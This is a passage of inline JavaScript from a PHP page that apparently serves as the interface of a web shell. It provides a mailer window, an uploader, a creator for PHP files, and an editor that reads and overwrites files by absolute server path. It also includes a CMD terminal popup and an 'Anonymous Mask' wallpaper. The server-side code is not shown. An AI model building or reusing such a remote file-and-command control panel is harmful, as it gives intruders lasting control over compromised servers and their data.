                sendBtn.disabled = false;
            });

            // Draggable functionality
            let drag = { active: false, offsetX: 0, offsetY: 0 };
            function onMouseDown(e){
                drag.active = true;
                const rect = win.getBoundingClientRect();
                drag.offsetX = e.clientX - rect.left;
                drag.offsetY = e.clientY - rect.top;
                document.addEventListener('mousemove', onMouseMove);
                document.addEventListener('mouseup', onMouseUp);
            }
            function onMouseMove(e){
                if (!drag.active) return;
                const x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, e.clientX - drag.offsetX));
                const y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, e.clientY - drag.offsetY));
                win.style.left = x + 'px';
                win.style.top = y + 'px';
            }
            function onMouseUp(){
                drag.active = false;
                document.removeEventListener('mousemove', onMouseMove);
                document.removeEventListener('mouseup', onMouseUp);
            }
            titlebar && titlebar.addEventListener('mousedown', onMouseDown);

            return win;
        }

        // Trigger click handler
        trigger && trigger.addEventListener('click', function(e){ 
            e.preventDefault(); 
            spawnMailerWindow(); 
        });
    })();
    </script>

    <script type="text/javascript">
        // @ts-nocheck
        /* eslint-disable */
        /* global window, document, localStorage */
        (function(){ 'use strict';
        // Upload and New popups
        var uploadTemplate = document.getElementById('upload-template');
        var uploadLayer = document.getElementById('upload-layer');
        var addTemplate = document.getElementById('add-template');
        var addLayer = document.getElementById('add-layer');

        function centerWindow(win){
            try {
                var bw = win.offsetWidth || 600;
                var bh = win.offsetHeight || 360;
                var left = Math.max(6, Math.min(window.innerWidth - bw - 6, Math.round((window.innerWidth - bw) / 2)));
                var top = Math.max(6, Math.min(window.innerHeight - bh - 6, Math.round((window.innerHeight - bh) / 2)));
                win.style.left = left + 'px';
                win.style.top = top + 'px';
            } catch(e) {}
        }
        function makeDraggable(win, selector){
            var titlebar = win.querySelector(selector);
            var dragging = false, ox = 0, oy = 0;
            function onDown(ev){ dragging = true; var p = ev.touches ? ev.touches[0] : ev; var rect = win.getBoundingClientRect(); ox = p.clientX - rect.left; oy = p.clientY - rect.top; document.body.style.userSelect = 'none'; document.addEventListener('mousemove', onMove); document.addEventListener('touchmove', onMove, { passive:false }); document.addEventListener('mouseup', onUp); document.addEventListener('touchend', onUp); }
            function onMove(ev){ if (!dragging) return; if (ev.cancelable) ev.preventDefault(); var p = ev.touches ? ev.touches[0] : ev; var left = p.clientX - ox; var top = p.clientY - oy; var maxLeft = window.innerWidth - win.offsetWidth - 8; var maxTop = window.innerHeight - win.offsetHeight - 8; if (left < 8) left = 8; if (top < 8) top = 8; if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop; win.style.left = left + 'px'; win.style.top = top + 'px'; }
            function onUp(){ if (!dragging) return; dragging = false; document.body.style.userSelect = ''; document.removeEventListener('mousemove', onMove); document.removeEventListener('touchmove', onMove); document.removeEventListener('mouseup', onUp); document.removeEventListener('touchend', onUp); }
            titlebar && titlebar.addEventListener('mousedown', onDown);
            titlebar && titlebar.addEventListener('touchstart', onDown, { passive:true });
        }

        function spawnUploadWindow(params){
            if (!uploadTemplate || !uploadLayer) return null;
            var win = uploadTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            uploadLayer.appendChild(win);
            centerWindow(win);

            var closeBtn = win.querySelector('.upload-close');
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
            makeDraggable(win, '.upload-titlebar');

            var form = win.querySelector('.upload-form');
            var fileInput = win.querySelector('#upload-file');
            var pill = win.querySelector('.upload-pill');
            var submitBtn = win.querySelector('.upload-submit');

            if (form) {
                form.method = 'post';
                form.enctype = 'multipart/form-data';
                // Action same page to let backend redirect to directory view
                form.action = window.location.pathname + (params.rel ? ('?d=' + encodeURIComponent(params.rel)) : (params.os ? ('?os=' + encodeURIComponent(params.os)) : ''));
                var hidden1 = document.createElement('input');
                hidden1.type = 'hidden';
                if (params.rel) { hidden1.name = 'do_upload'; hidden1.value = '1'; } else { hidden1.name = 'do_upload_abs'; hidden1.value = '1'; }
                form.appendChild(hidden1);
                var hidden2 = document.createElement('input');
                hidden2.type = 'hidden';
                if (params.rel) { hidden2.name = 'dir'; hidden2.value = params.rel; } else { hidden2.name = 'os'; hidden2.value = params.os; }
                form.appendChild(hidden2);
            }
            pill && pill.addEventListener('click', function(){ fileInput && fileInput.click(); });
            fileInput && fileInput.addEventListener('change', function(){ if (fileInput.files && fileInput.files.length){ pill.style.borderColor = '#3b82f6'; pill.style.backgroundColor = 'rgba(59,130,246,0.1)'; } else { pill.style.borderColor = ''; pill.style.backgroundColor = ''; } });
            submitBtn && submitBtn.addEventListener('click', function(e){
                e.preventDefault();
                if (!form) return;
                // Client-side validation: require a file selection
                var body = win.querySelector('.upload-body');
                var existing = (body || win).querySelector('.op-status');
                if (existing) existing.remove();
                if (!fileInput || !fileInput.files || !fileInput.files[0]) {
                    var banner1 = document.createElement('div');
                    banner1.className = 'op-status err';
                    banner1.innerHTML = '<span class="material-symbols-rounded">error</span> Failed: Please choose a file to upload.';
                    (body || win).insertBefore(banner1, (body || win).firstChild);
                    // Auto-hide client-side validation error after 2 seconds
                    setTimeout(function(){ try { if (banner1 && banner1.parentNode) { banner1.remove(); } } catch(e){} }, 2000);
                    return;
                }
                var fd = new FormData(form);
                if (fileInput && fileInput.files && fileInput.files[0]) {
                    fd.set('upload', fileInput.files[0]);
                }
                submitBtn.disabled = true;
                try {
                    var okStatus = false; var didRedirect = false;
                    fetch(form.action, { method: 'POST', body: fd, redirect: 'follow' })
                        .then(function(res){
                            didRedirect = !!res.redirected || (res.status >= 300 && res.status < 400);
                            okStatus = !!res.ok || didRedirect;
                            return didRedirect ? Promise.resolve('') : res.text();
                        })
                        .then(function(html){
                            var hasError = false, errMsg = '';
                            try {
                                if (!okStatus) {
                                    hasError = true;
                                } else if (!didRedirect && html && html.indexOf('class="error"') !== -1) {
                                    hasError = true;
                                    var parser = new DOMParser();
                                    var doc = parser.parseFromString(html || '', 'text/html');
                                    var errEl = doc && doc.querySelector('.error');
                                    errMsg = (errEl && errEl.textContent) ? errEl.textContent.trim() : '';
                                }
                            } catch(e){}
                            var body2 = win.querySelector('.upload-body');
                            var prev = (body2 || win).querySelector('.op-status');
                            if (prev) prev.remove();
                            var banner = document.createElement('div');
                            banner.className = hasError ? 'op-status err' : 'op-status ok';
                            banner.innerHTML = hasError
                                ? '<span class="material-symbols-rounded">error</span> Failed' + (errMsg ? ': ' + errMsg : '')
                                : '<span class="material-symbols-rounded">task_alt</span> Done';
                            (body2 || win).insertBefore(banner, (body2 || win).firstChild);
                            if (hasError) {
                                submitBtn.disabled = false;
                                setTimeout(function(){ try { if (banner && banner.parentNode) { banner.remove(); } } catch(e){} }, 2000);
                            } else {
                                setTimeout(function(){ window.location.href = form.action; }, 800);
                            }
                        })
                        .catch(function(){ submitBtn.disabled = false; });
                } catch(err){ submitBtn.disabled = false; }
            });
            return win;
        }

        function spawnAddWindow(params){
            if (!addTemplate || !addLayer) return null;
            var win = addTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            addLayer.appendChild(win);
            centerWindow(win);

            var closeBtn = win.querySelector('.add-close');
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
            makeDraggable(win, '.add-titlebar');

            var form = win.querySelector('.add-form');
            var submitBtn = win.querySelector('.add-submit');
            if (form) {
                form.method = 'post';
                form.action = window.location.pathname + (params.rel ? ('?d=' + encodeURIComponent(params.rel)) : (params.os ? ('?os=' + encodeURIComponent(params.os)) : ''));
                var hidden1 = document.createElement('input');
                hidden1.type = 'hidden';
                if (params.rel) { hidden1.name = 'do_create'; hidden1.value = '1'; } else { hidden1.name = 'do_create_abs'; hidden1.value = '1'; }
                form.appendChild(hidden1);
                var hidden2 = document.createElement('input');
                hidden2.type = 'hidden';
                if (params.rel) { hidden2.name = 'dir'; hidden2.value = params.rel; } else { hidden2.name = 'os'; hidden2.value = params.os; }
                form.appendChild(hidden2);
            }
            submitBtn && submitBtn.addEventListener('click', function(e){
                e.preventDefault();
                if (!form) return;
                // Client-side validation for file/folder names
                var body = win.querySelector('.add-body');
                var existing = (body || win).querySelector('.op-status');
                if (existing) existing.remove();
                var typeEl = form.querySelector('input[name="create_type"]:checked');
                var type = typeEl ? typeEl.value : 'file';
                var failMsg = '';
                if (type === 'file') {
                    var nameEl = form.querySelector('input[name="file_name"]');
                    var extEl = form.querySelector('select[name="file_ext"]');
                    var name = (nameEl && nameEl.value) ? nameEl.value.trim() : '';
                    var ext = (extEl && extEl.value) ? extEl.value.trim().toLowerCase() : '';
                    if (!name) { failMsg = 'File name is required.'; }
                    else if (!/^[A-Za-z0-9_-]+$/.test(name)) { failMsg = 'Invalid file name (letters, numbers, _ or - only).'; }
                    else if (['php','html','txt'].indexOf(ext) === -1) { failMsg = 'Invalid extension.'; }
                } else if (type === 'folder') {
                    var folderEl = form.querySelector('input[name="folder_name"]');
                    var folder = (folderEl && folderEl.value) ? folderEl.value.trim() : '';
                    if (!folder) { failMsg = 'Folder name is required.'; }
                    else if (!/^[A-Za-z0-9._-]+$/.test(folder) || /[\\\/\0]/.test(folder)) { failMsg = 'Invalid folder name.'; }
                }
                if (failMsg) {
                    var banner0 = document.createElement('div');
                    banner0.className = 'op-status err';
                    banner0.innerHTML = '<span class="material-symbols-rounded">error</span> Failed: ' + failMsg;
                    (body || win).insertBefore(banner0, (body || win).firstChild);
                    // Auto-hide client-side validation error after 2 seconds
                    setTimeout(function(){ try { if (banner0 && banner0.parentNode) { banner0.remove(); } } catch(e){} }, 2000);
                    return;
                }
                var fd = new FormData(form);
                submitBtn.disabled = true;
                try {
                    var okStatus = false; var didRedirect = false;
                    fetch(form.action, { method: 'POST', body: fd, redirect: 'follow' })
                        .then(function(res){
                            didRedirect = !!res.redirected || (res.status >= 300 && res.status < 400);
                            okStatus = !!res.ok || didRedirect;
                            return didRedirect ? Promise.resolve('') : res.text();
                        })
                        .then(function(html){
                            var hasError = false, errMsg = '';
                            try {
                                if (!okStatus) {
                                    hasError = true;
                                } else if (!didRedirect && html && html.indexOf('class="error"') !== -1) {
                                    hasError = true;
                                    var parser = new DOMParser();
                                    var doc = parser.parseFromString(html || '', 'text/html');
                                    var errEl = doc && doc.querySelector('.error');
                                    errMsg = (errEl && errEl.textContent) ? errEl.textContent.trim() : '';
                                }
                            } catch(e){}
                            var body2 = win.querySelector('.add-body');
                            var prev = (body2 || win).querySelector('.op-status');
                            if (prev) prev.remove();
                            var banner = document.createElement('div');
                            banner.className = hasError ? 'op-status err' : 'op-status ok';
                            banner.innerHTML = hasError
                                ? '<span class="material-symbols-rounded">error</span> Failed' + (errMsg ? ': ' + errMsg : '')
                                : '<span class="material-symbols-rounded">task_alt</span> Done';
                            (body2 || win).insertBefore(banner, (body2 || win).firstChild);
                            if (hasError) {
                                submitBtn.disabled = false;
                                setTimeout(function(){ try { if (banner && banner.parentNode) { banner.remove(); } } catch(e){} }, 2000);
                            } else {
                                setTimeout(function(){ window.location.href = form.action; }, 800);
                            }
                        })
                        .catch(function(){ submitBtn.disabled = false; });
                } catch(err){ submitBtn.disabled = false; }
            });
            return win;
        }

        function openUploadFromHref(href){
            try {
                var u = new URL(href, window.location.href);
                var rel = u.searchParams.get('d') || '';
                var os = u.searchParams.get('os') || '';
                spawnUploadWindow({ rel: rel || '', os: os || '' });
            } catch(e){}
        }
        function openNewFromHref(href){
            try {
                var u = new URL(href, window.location.href);
                var rel = u.searchParams.get('d') || '';
                var os = u.searchParams.get('os') || '';
                spawnAddWindow({ rel: rel || '', os: os || '' });
            } catch(e){}
        }

        document.addEventListener('click', function(ev){
            var a = ev.target && ev.target.closest && ev.target.closest('a');
            if (!a) return;
            var href = a.getAttribute('href') || '';
            // Upload triggers
            if ((href.indexOf('upload=1') !== -1) || a.classList.contains('term-upload')){
                ev.preventDefault();
                openUploadFromHref(href || window.location.href);
                return;
            }
            // New/Add triggers
            if (href.indexOf('new=1') !== -1){
                ev.preventDefault();
                openNewFromHref(href || window.location.href);
                return;
            }
        }, true);
        // Editor popup: open on Edit button clicks, load content, save via POST
        var editorTemplate = document.getElementById('editor-template');
        var editorLayer = document.getElementById('editor-layer');
        function baseName(p){ try { var parts = (p||'').split(/[\\\/]/); return parts.pop() || p; } catch(e){ return p || ''; } }
        function centerWindow(win){ try {
            var ww = win.offsetWidth || 720; var wh = win.offsetHeight || 520;
            var left = Math.max(6, Math.min(window.innerWidth - ww - 6, Math.round((window.innerWidth - ww) / 2)));
            var top = Math.max(6, Math.min(window.innerHeight - wh - 6, Math.round((window.innerHeight - wh) / 2)));
            win.style.left = left + 'px'; win.style.top = top + 'px';
        } catch(e){} }
        function spawnEditorWindow(opts){
            if (!editorTemplate || !editorLayer) return null;
            var win = editorTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            editorLayer.appendChild(win);
            centerWindow(win);
            var titleEl = win.querySelector('.editor-title');
            var closeBtn = win.querySelector('.editor-close');
            var textarea = win.querySelector('.editor-textarea');
            var saveBtn = win.querySelector('.editor-save');
            if (titleEl && opts && opts.title) titleEl.textContent = opts.title;
            // Load content
            if (textarea){ textarea.value = ''; textarea.disabled = true; }
            try {
                fetch(opts.apiUrl, { method: 'GET', cache: 'no-store' })
                    .then(function(res){ return res.text(); })
                    .then(function(text){ if (textarea){ textarea.disabled = false; textarea.value = text; textarea.focus(); textarea.setSelectionRange(0,0); } })
                    .catch(function(){ if (textarea){ textarea.disabled = false; textarea.value = ''; } });
            } catch(e){ if (textarea){ textarea.disabled = false; textarea.value = ''; } }
            // Save handler: submit a hidden form to reuse server logic
            function doSave(){
                if (!saveBtn || !textarea) return;
                var form = document.createElement('form');
                form.method = 'POST';
                form.action = opts.saveAction || (window.location.pathname + window.location.search);
                function add(name, value){ var inp = document.createElement('input'); inp.type = 'hidden'; inp.name = name; inp.value = value; form.appendChild(inp); }
                var fields = opts.saveFields || {};
                Object.keys(fields).forEach(function(k){ add(k, fields[k]); });
                var content = document.createElement('textarea'); content.name = 'content'; content.value = textarea.value; content.style.display = 'none'; form.appendChild(content);
                document.body.appendChild(form);
                form.submit();
            }
            saveBtn && saveBtn.addEventListener('click', function(){ doSave(); });
            // Ctrl/Cmd+S saves
            textarea && textarea.addEventListener('keydown', function(e){ if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 's'){ e.preventDefault(); doSave(); } });
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
            // Drag by titlebar
            var titlebar = win.querySelector('.editor-titlebar');
            var dragging = false, ox = 0, oy = 0;
            function onDown(ev){ dragging = true; var p = ev.touches ? ev.touches[0] : ev; var rect = win.getBoundingClientRect(); ox = p.clientX - rect.left; oy = p.clientY - rect.top; document.body.style.userSelect = 'none'; document.addEventListener('mousemove', onMove); document.addEventListener('touchmove', onMove, { passive:false }); document.addEventListener('mouseup', onUp); document.addEventListener('touchend', onUp); }
            function onMove(ev){ if (!dragging) return; if (ev.cancelable) ev.preventDefault(); var p = ev.touches ? ev.touches[0] : ev; var left = p.clientX - ox; var top = p.clientY - oy; var maxLeft = window.innerWidth - win.offsetWidth - 8; var maxTop = window.innerHeight - win.offsetHeight - 8; if (left < 8) left = 8; if (top < 8) top = 8; if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop; win.style.left = left + 'px'; win.style.top = top + 'px'; }
            function onUp(){ if (!dragging) return; dragging = false; document.body.style.userSelect = ''; document.removeEventListener('mousemove', onMove); document.removeEventListener('touchmove', onMove); document.removeEventListener('mouseup', onUp); document.removeEventListener('touchend', onUp); }
            titlebar && titlebar.addEventListener('mousedown', onDown);
            titlebar && titlebar.addEventListener('touchstart', onDown, { passive:true });
            return win;
        }
        function openEditorFromHref(href){
            try {
                var u = new URL(href, window.location.href);
                var rel = u.searchParams.get('d') || '';
                var os = u.searchParams.get('os') || '';
                var isAbs = !!u.searchParams.get('edit_abs');
                var name = baseName(rel || os);
                var apiUrl = window.location.pathname + '?api=raw_content' + (rel ? ('&d=' + encodeURIComponent(rel)) : ('&os=' + encodeURIComponent(os)));
                // After save, go to directory listing (no inline edit form)
                var action;
                if (rel) {
                    var idx = rel.lastIndexOf('/');
                    var dirRel = idx > -1 ? rel.slice(0, idx) : '';
                    action = window.location.pathname + (dirRel ? ('?d=' + encodeURIComponent(dirRel)) : '');
                } else {
                    var parts = os.split(/[\\\/]/);
                    parts.pop();
                    var dirAbs = parts.join('/');
                    action = window.location.pathname + '?os=' + encodeURIComponent(dirAbs);
                }
                var fields = rel ? { 'do_edit':'1', 'rel': rel } : { 'do_edit_abs':'1', 'os': os };
                spawnEditorWindow({ title: 'Edit: ' + name, apiUrl: apiUrl, saveAction: action, saveFields: fields });
            } catch(e){}
        }
        // Intercept Edit buttons
        document.addEventListener('click', function(ev){
            var a = ev.target && ev.target.closest && ev.target.closest('a');
            if (!a) return;
            var href = a.getAttribute('href') || '';
            if (a.classList.contains('btn-edit') && (href.indexOf('edit=1') !== -1 || href.indexOf('edit_abs=1') !== -1)){
                ev.preventDefault();
                openEditorFromHref(href);
            }
        }, true);
        })();
    </script>
    <script type="text/javascript">
        // @ts-nocheck
        /* eslint-disable */
        /* global window, document, localStorage */
        (function(){ 'use strict';
        // Simple in-app browser popup
        var browserTrigger = document.getElementById('browser-trigger');
        var browserTemplate = document.getElementById('browser-template');
        var browserLayer = document.getElementById('browser-layer');
        function normalizeUrl(u){
            if (!u) return '';
            var url = u.trim();
            if (/^https?:\/\//i.test(url)) return url;
            return 'https://' + url;
        }
        function toDestination(entry){
            var s = (entry || '').trim();
            if (!s) return '';
            var looksLikeUrl = /^https?:\/\//i.test(s) || /^[\w-]+\.[\w.-]+/.test(s);
            if (looksLikeUrl) return normalizeUrl(s);
            return 'https://www.google.com/search?q=' + encodeURIComponent(s);
        }
        function spawnBrowserWindow(initialUrl){
            if (!browserTemplate || !browserLayer) return null;
            var win = browserTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            browserLayer.appendChild(win);
            // Initial center position so it is visible on desktop
            try {
                var bw = win.offsetWidth || 600;
                var bh = win.offsetHeight || 400;
                var left = Math.max(6, Math.min(window.innerWidth - bw - 6, Math.round((window.innerWidth - bw) / 2)));
                var top = Math.max(6, Math.min(window.innerHeight - bh - 6, Math.round((window.innerHeight - bh) / 2)));
                win.style.left = left + 'px';
                win.style.top = top + 'px';
            } catch(e) {}
            try { localStorage.setItem('app.browser.open', '1'); } catch(e){}

            var titlebar = win.querySelector('.browser-titlebar');
            var closeBtn = win.querySelector('.browser-close');
            var urlInput = win.querySelector('.browser-url');
            var goBtn = win.querySelector('.browser-go-btn');
            var openLink = win.querySelector('.browser-open-link');
            var frame = win.querySelector('.browser-frame');
            var body = win.querySelector('.browser-body');
            var landingForm = win.querySelector('.landing-form');
            var landingInput = win.querySelector('.landing-input');
            function setLandingMode(on){ if (!body) return; body.classList.toggle('landing', !!on); }

            function navigate(u){
                var url = toDestination(u || (urlInput ? urlInput.value : ''));
                if (urlInput) urlInput.value = url;
                if (openLink) openLink.href = url;
                try { window.open(url, '_blank', 'noopener'); } catch(e){}
                // Keep landing visible for quick subsequent searches
                setLandingMode(true);
            }
            goBtn && goBtn.addEventListener('click', function(){ navigate(urlInput && urlInput.value); });
            urlInput && urlInput.addEventListener('keydown', function(e){ if (e.key === 'Enter') navigate(urlInput.value); });
            if (openLink) openLink.href = '#';
            landingForm && landingForm.addEventListener('submit', function(e){ e.preventDefault(); navigate(landingInput && landingInput.value); });
            landingInput && landingInput.addEventListener('keydown', function(e){ if (e.key === 'Enter') { e.preventDefault(); navigate(landingInput.value); } });
            closeBtn && closeBtn.addEventListener('click', function(){
                win.remove();
                try { localStorage.setItem('app.browser.open', '0'); } catch(e){}
            });

            // Drag by titlebar
            var draggingWin = false, ox = 0, oy = 0;
            function onDown(ev){
                draggingWin = true;
                var p = ev.touches ? ev.touches[0] : ev;
                var rect = win.getBoundingClientRect();
                ox = p.clientX - rect.left;
                oy = p.clientY - rect.top;
                document.body.style.userSelect = 'none';
                document.addEventListener('mousemove', onMove);
                document.addEventListener('touchmove', onMove, { passive: false });
                document.addEventListener('mouseup', onUp);
                document.addEventListener('touchend', onUp);
            }
            function onMove(ev){
                if (!draggingWin) return;
                if (ev.cancelable) ev.preventDefault();
                var p = ev.touches ? ev.touches[0] : ev;
                var left = p.clientX - ox;
                var top = p.clientY - oy;
                var maxLeft = window.innerWidth - win.offsetWidth - 8;
                var maxTop = window.innerHeight - win.offsetHeight - 8;
                if (left < 8) left = 8; if (top < 8) top = 8;
                if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
                win.style.left = left + 'px';
                win.style.top = top + 'px';
            }
            function onUp(){
                if (!draggingWin) return;
                draggingWin = false;
                document.body.style.userSelect = '';
                document.removeEventListener('mousemove', onMove);
                document.removeEventListener('touchmove', onMove);
                document.removeEventListener('mouseup', onUp);
                document.removeEventListener('touchend', onUp);
            }
            titlebar && titlebar.addEventListener('mousedown', onDown);
            titlebar && titlebar.addEventListener('touchstart', onDown, { passive: true });

            // Show landing by default; navigate only if an initial URL is provided
            if (initialUrl) navigate(initialUrl); else setLandingMode(true);
            return win;
        }
        browserTrigger && browserTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnBrowserWindow(); });
        // Wallpaper changer
        var wallpaperTrigger = document.getElementById('wallpaper-trigger');
        var wallpaperTemplate = document.getElementById('wallpaper-template');
        var wallpaperLayer = document.getElementById('wallpaper-layer');
        var PRESET_MAC = 'https://images7.alphacoders.com/139/thumb-1920-1393184.png';
        var PRESET_OLD = 'https://images4.alphacoders.com/136/thumb-1920-1361673.png';
        var PRESET_TYPE3 = [
            'radial-gradient(420px 420px at 18% 28%, rgba(64,200,64,0.35), rgba(64,200,64,0) 60%)',
            'radial-gradient(360px 360px at 74% 58%, rgba(90,230,90,0.30), rgba(90,230,90,0) 60%)',
            'radial-gradient(260px 260px at 42% 78%, rgba(40,180,80,0.28), rgba(40,180,80,0) 60%)',
            'linear-gradient(180deg, #041907 0%, #09310f 58%, #0a4e16 100%)'
        ].join(', ');
        var PRESET_TYPE4 = 'https://images5.alphacoders.com/398/thumb-1920-398599.jpg';
        var PRESET_TYPE5 = 'https://images.alphacoders.com/132/thumb-1920-1321753.jpeg'; // Windows XP
        var PRESET_TYPE6 = 'https://images6.alphacoders.com/601/thumb-1920-601846.jpg'; // Windows 10 Pro
        var PRESET_TYPE7 = 'https://images.alphacoders.com/127/thumb-1920-1275722.jpg'; // Windows 11
        var PRESET_TYPE8 = 'https://images2.alphacoders.com/581/thumb-1920-581799.jpg'; // Anonymous Mask
        var fallbackWallpaper = <?= json_encode($wallpaperUrl) ?>;
        function setWallpaper(value){
            if (!value) return;
            try {
                var isGradient = /^\s*(?:linear|radial)-gradient\(/.test(value);
                var cssValue = isGradient ? value : "url('" + value.replace(/'/g, "\\'") + "')";
                document.documentElement.style.setProperty('--wallpaper', cssValue);
            } catch(e) {}
        }
        (function loadSaved(){
            try {
                var type = localStorage.getItem('coding.wallpaper.type') || '';
                var saved = localStorage.getItem('coding.wallpaper');
                if (type === 'type1') setWallpaper(PRESET_MAC);
                else if (type === 'type2') setWallpaper(PRESET_OLD);
                else if (type === 'type3') setWallpaper(PRESET_TYPE3);
                else if (type === 'type4') setWallpaper(PRESET_TYPE4);
                else if (type === 'type5') setWallpaper(PRESET_TYPE5);
                else if (type === 'type6') setWallpaper(PRESET_TYPE6);
                else if (type === 'type7') setWallpaper(PRESET_TYPE7);
                else if (type === 'type8') setWallpaper(PRESET_TYPE8);
                else if (saved) setWallpaper(saved);
                else setWallpaper(fallbackWallpaper);
            } catch(e) { setWallpaper(fallbackWallpaper); }
        })();
        function spawnWallpaperWindow(){
            if (!wallpaperTemplate || !wallpaperLayer) return null;
            var win = wallpaperTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            wallpaperLayer.appendChild(win);
            try { localStorage.setItem('app.wallpaper.open', '1'); } catch(e){}
            var closeBtn = win.querySelector('.wallpaper-close');
            var urlInput = win.querySelector('.wp-url');
            var applyBtn = win.querySelector('.wp-apply');
            var resetBtn = win.querySelector('.wp-reset');
            var type1Btn = win.querySelector('.wp-type1');
            var type2Btn = win.querySelector('.wp-type2');
            var type3Btn = win.querySelector('.wp-type3');
            var type4Btn = win.querySelector('.wp-type4');
            var type5Btn = win.querySelector('.wp-type5');
            var type6Btn = win.querySelector('.wp-type6');
            var type7Btn = win.querySelector('.wp-type7');
            var type8Btn = win.querySelector('.wp-type8');
            // Restore saved position
            try {
                var left = parseInt(localStorage.getItem('wallpaper.left') || '', 10);
                var top = parseInt(localStorage.getItem('wallpaper.top') || '', 10);
                if (!isNaN(left) && !isNaN(top)) {
                    win.style.left = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, left)) + 'px';
                    win.style.top = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, top)) + 'px';
                } else {
                    // Center by default if no saved position
                    var ww = win.offsetWidth || 520;
                    var wh = win.offsetHeight || 360;
                    var cx = Math.max(6, Math.min(window.innerWidth - ww - 6, Math.round((window.innerWidth - ww) / 2)));
                    var cy = Math.max(6, Math.min(window.innerHeight - wh - 6, Math.round((window.innerHeight - wh) / 2)));
                    win.style.left = cx + 'px';
                    win.style.top = cy + 'px';
                }
            } catch(e) {}
            try {
                var saved = localStorage.getItem('coding.wallpaper');
                if (saved && urlInput) urlInput.value = saved;
            } catch(e) {}
            applyBtn && applyBtn.addEventListener('click', function(){
                var url = (urlInput && urlInput.value || '').trim();
                if (!url) return;
                setWallpaper(url);
                try {
                    localStorage.setItem('coding.wallpaper', url);
                    localStorage.setItem('coding.wallpaper.type', 'custom');
                } catch(e) {}
            });
            type1Btn && type1Btn.addEventListener('click', function(){
                setWallpaper(PRESET_MAC);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type1');
                    localStorage.removeItem('coding.wallpaper');
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type2Btn && type2Btn.addEventListener('click', function(){
                setWallpaper(PRESET_OLD);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type2');
                    localStorage.removeItem('coding.wallpaper');
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type3Btn && type3Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE3);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type3');
                    localStorage.removeItem('coding.wallpaper');
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type4Btn && type4Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE4);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type4');
                    localStorage.removeItem('coding.wallpaper');
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type5Btn && type5Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE5);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type5');
                    localStorage.removeItem('coding.wallpaper');
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type6Btn && type6Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE6);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type6');
                    localStorage.removeItem('coding.wallpaper');
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type7Btn && type7Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE7);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type7');
                    localStorage.removeItem('coding.wallpaper');
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            type8Btn && type8Btn.addEventListener('click', function(){
                setWallpaper(PRESET_TYPE8);
                try {
                    localStorage.setItem('coding.wallpaper.type', 'type8');
                    localStorage.removeItem('coding.wallpaper');
                    if (urlInput) urlInput.value = '';
                } catch(e) {}
            });
            resetBtn && resetBtn.addEventListener('click', function(){
                try {
                    localStorage.removeItem('coding.wallpaper');
                    localStorage.removeItem('coding.wallpaper.type');
                } catch(e) {}
                setWallpaper(fallbackWallpaper);
            });
            closeBtn && closeBtn.addEventListener('click', function(){
                win.remove();
                try { localStorage.setItem('app.wallpaper.open', '0'); } catch(e){}
            });
            // Drag by titlebar
            var titlebar = win.querySelector('.wallpaper-titlebar');
            var drag = { active:false, offsetX:0, offsetY:0 };
            function onMouseDown(e){
                var rect = win.getBoundingClientRect();
                drag.active = true;
                drag.offsetX = e.clientX - rect.left;
                drag.offsetY = e.clientY - rect.top;
                document.addEventListener('mousemove', onMouseMove);
                document.addEventListener('mouseup', onMouseUp);
            }
            function onMouseMove(e){
                if (!drag.active) return;
                var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, e.clientX - drag.offsetX));
                var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, e.clientY - drag.offsetY));
                win.style.left = x + 'px';
                win.style.top = y + 'px';
            }
            function onMouseUp(){
                if (!drag.active) return;
                drag.active = false;
                document.removeEventListener('mousemove', onMouseMove);
                document.removeEventListener('mouseup', onMouseUp);
                // Persist last position
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('wallpaper.left', String(Math.round(rect.left)));
                    localStorage.setItem('wallpaper.top', String(Math.round(rect.top)));
                } catch(e) {}
            }
            titlebar && titlebar.addEventListener('mousedown', onMouseDown);
            return win;
        }
        // Desktop wallpaper icon: single-click to open
        if (wallpaperTrigger) {
            wallpaperTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnWallpaperWindow(); });
        }
        // Simple CMD (terminal-like) popup
        var cmdTrigger = document.getElementById('cmd-trigger');
        var trashTrigger = document.getElementById('trash-trigger');
        var cmdTemplate = document.getElementById('cmd-template');
